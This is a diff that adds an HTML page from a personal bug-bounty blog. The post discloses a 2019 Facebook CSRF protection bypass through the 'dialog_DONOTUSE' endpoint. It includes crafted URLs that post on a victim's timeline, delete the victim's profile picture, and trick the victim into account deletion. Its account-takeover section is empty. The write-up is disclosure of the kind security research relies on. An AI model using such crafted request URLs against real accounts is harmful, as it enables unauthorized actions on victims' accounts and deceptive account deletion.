@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Facebook CSRF protection bypass which leads to Account Takeover. | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Facebook CSRF protection bypass which leads to Account Takeover." />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This bug could have allowed malicious users to send requests with CSRF tokens to arbitrary endpoints on Facebook which could lead to takeover of victims accounts. In order for this attack to be effective, an attacker would have to trick the target into clicking on a link. Demonstration This is possible because of a vulnerable endpoint which takes another given Facebook endpoint selected by the attacker along with the parameters and make a POST request to that endpoint after adding the fb_dtsg parameter. Also this endpoint is located under the main domain&nbsp;www.facebook.com&nbsp;which makes it easier for the attacker to trick his victims to visit the URL.&nbsp;The vulnerable endpoint is: https://www.facebook.com/comet/dialog_DONOTUSE/?url=XXXX where XXXX is the endpoint with parameters where the POST request is going to be made (the CSRF token fb_dtsg is added automatically to the request body).This allowed me to make many actions if the victim visits this URLs. Some of these are: Make a post on timeline: https://www.facebook.com/comet/dialog_DONOTUSE/?url= /api/graphql/%3fdoc_id=1740513229408093%26variables={&quot;input&quot;:{&quot;actor_id&quot;:{TARGET_ID},&quot;client_mutation_id&quot;:&quot;1&quot;,&quot;source&quot;:&quot;WWW&quot;,&quot;audience&quot;:{&quot;web_privacyx&quot;:&quot;REDECATED&quot;},&quot;message&quot;:{&quot;text&quot;:&quot;TEXT&quot;,&quot;ranges&quot;:[]}}} Delete Profile Picture: https://www.facebook.com/comet/dialog_DONOTUSE/? url=/profile/picture/remove_picture/%3fdelete_from_album=1%26profile_id={TARGET_ID} Trick user to delete their account (After changing language with &quot;locale&quot; parameter) https://www.facebook.com/comet/dialog_DONOTUSE/? url=/help/delete_account/dialog/%3f__asyncDialog=0%26locale=fr_FR This will promote a password confirmation dialog, if the victim enters his password then his account will be deleted. Account Takeover Approach" />
+<meta property="og:description" content="This bug could have allowed malicious users to send requests with CSRF tokens to arbitrary endpoints on Facebook which could lead to takeover of victims accounts. In order for this attack to be effective, an attacker would have to trick the target into clicking on a link. Demonstration This is possible because of a vulnerable endpoint which takes another given Facebook endpoint selected by the attacker along with the parameters and make a POST request to that endpoint after adding the fb_dtsg parameter. Also this endpoint is located under the main domain&nbsp;www.facebook.com&nbsp;which makes it easier for the attacker to trick his victims to visit the URL.&nbsp;The vulnerable endpoint is: https://www.facebook.com/comet/dialog_DONOTUSE/?url=XXXX where XXXX is the endpoint with parameters where the POST request is going to be made (the CSRF token fb_dtsg is added automatically to the request body).This allowed me to make many actions if the victim visits this URLs. Some of these are: Make a post on timeline: https://www.facebook.com/comet/dialog_DONOTUSE/?url= /api/graphql/%3fdoc_id=1740513229408093%26variables={&quot;input&quot;:{&quot;actor_id&quot;:{TARGET_ID},&quot;client_mutation_id&quot;:&quot;1&quot;,&quot;source&quot;:&quot;WWW&quot;,&quot;audience&quot;:{&quot;web_privacyx&quot;:&quot;REDECATED&quot;},&quot;message&quot;:{&quot;text&quot;:&quot;TEXT&quot;,&quot;ranges&quot;:[]}}} Delete Profile Picture: https://www.facebook.com/comet/dialog_DONOTUSE/? url=/profile/picture/remove_picture/%3fdelete_from_album=1%26profile_id={TARGET_ID} Trick user to delete their account (After changing language with &quot;locale&quot; parameter) https://www.facebook.com/comet/dialog_DONOTUSE/? url=/help/delete_account/dialog/%3f__asyncDialog=0%26locale=fr_FR This will promote a password confirmation dialog, if the victim enters his password then his account will be deleted. Account Takeover Approach" />
+<link rel="canonical" href="http://localhost:4000/uncategorized/2019/02/12/facebook-csrf-protection-bypass-which-leads-to-account-takeover.html" />
+<meta property="og:url" content="http://localhost:4000/uncategorized/2019/02/12/facebook-csrf-protection-bypass-which-leads-to-account-takeover.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-02-12T18:03:15+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Facebook CSRF protection bypass which leads to Account Takeover." />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2019-02-12T18:03:15+01:00","datePublished":"2019-02-12T18:03:15+01:00","description":"This bug could have allowed malicious users to send requests with CSRF tokens to arbitrary endpoints on Facebook which could lead to takeover of victims accounts. In order for this attack to be effective, an attacker would have to trick the target into clicking on a link. Demonstration This is possible because of a vulnerable endpoint which takes another given Facebook endpoint selected by the attacker along with the parameters and make a POST request to that endpoint after adding the fb_dtsg parameter. Also this endpoint is located under the main domain&nbsp;www.facebook.com&nbsp;which makes it easier for the attacker to trick his victims to visit the URL.&nbsp;The vulnerable endpoint is: https://www.facebook.com/comet/dialog_DONOTUSE/?url=XXXX where XXXX is the endpoint with parameters where the POST request is going to be made (the CSRF token fb_dtsg is added automatically to the request body).This allowed me to make many actions if the victim visits this URLs. Some of these are: Make a post on timeline: https://www.facebook.com/comet/dialog_DONOTUSE/?url= /api/graphql/%3fdoc_id=1740513229408093%26variables={&quot;input&quot;:{&quot;actor_id&quot;:{TARGET_ID},&quot;client_mutation_id&quot;:&quot;1&quot;,&quot;source&quot;:&quot;WWW&quot;,&quot;audience&quot;:{&quot;web_privacyx&quot;:&quot;REDECATED&quot;},&quot;message&quot;:{&quot;text&quot;:&quot;TEXT&quot;,&quot;ranges&quot;:[]}}} Delete Profile Picture: https://www.facebook.com/comet/dialog_DONOTUSE/? url=/profile/picture/remove_picture/%3fdelete_from_album=1%26profile_id={TARGET_ID} Trick user to delete their account (After changing language with &quot;locale&quot; parameter) https://www.facebook.com/comet/dialog_DONOTUSE/? url=/help/delete_account/dialog/%3f__asyncDialog=0%26locale=fr_FR This will promote a password confirmation dialog, if the victim enters his password then his account will be deleted. Account Takeover Approach","headline":"Facebook CSRF protection bypass which leads to Account Takeover.","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/uncategorized/2019/02/12/facebook-csrf-protection-bypass-which-leads-to-account-takeover.html"},"url":"http://localhost:4000/uncategorized/2019/02/12/facebook-csrf-protection-bypass-which-leads-to-account-takeover.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Facebook CSRF protection bypass which leads to Account Takeover.</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-02-12T18:03:15+01:00" itemprop="datePublished">Feb 12, 2019
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><!-- wp:paragraph --></p>
+<p>This bug could have allowed malicious users to send requests with CSRF tokens to arbitrary endpoints on Facebook which could lead to takeover of victims accounts.<!--more--> In order for this attack to be effective, an attacker would have to trick the target into clicking on a link.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph {"fontSize":"medium"} --></p>
+<p class="has-medium-font-size"><br><strong>Demonstration</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><br>This is possible because of a vulnerable endpoint which takes another given Facebook endpoint selected by the attacker along with the parameters and make a POST request to that endpoint after adding the fb_dtsg parameter. Also this endpoint is located under the main domain&nbsp;<a href="https://www.facebook.com/">www.facebook.com</a>&nbsp;which makes it easier for the attacker to trick his victims to visit the URL.&nbsp;<br><br>The vulnerable endpoint is: <br>https://www.facebook.com/comet/dialog_DONOTUSE/?url=XXXX where XXXX is the endpoint with parameters where the POST request is going to be made (the CSRF token  fb_dtsg is added automatically to the request body).<br><br>This allowed me to make many actions if the victim visits this URLs. Some of these are:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><br><strong>Make a post on timeline:</strong><br></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>https://www.facebook.com/comet/dialog_DONOTUSE/?url=
+/api/graphql/%3fdoc_id=1740513229408093%26variables={"input":{"actor_id":{TARGET_ID},"client_mutation_id":"1","source":"WWW","audience":{"web_privacyx":"REDECATED"},"message":{"text":"TEXT","ranges":[]}}}</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Delete Profile Picture:</strong><br></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>https://www.facebook.com/comet/dialog_DONOTUSE/?
+url=/profile/picture/remove_picture/%3fdelete_from_album=1%26profile_id={TARGET_ID} </code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Trick user to delete their account (After changing language with "locale" parameter)</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code>https://www.facebook.com/comet/dialog_DONOTUSE/?
+url=/help/delete_account/dialog/%3f__asyncDialog=0%26locale=fr_FR</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>This will promote a password confirmation dialog, if the victim enters his password then his account will be deleted.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph {"fontSize":"medium"} --></p>
+<p class="has-medium-font-size"><strong>Account Takeover Approach </strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+
+  </div><a class="u-url" href="/uncategorized/2019/02/12/facebook-csrf-protection-bypass-which-leads-to-account-takeover.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
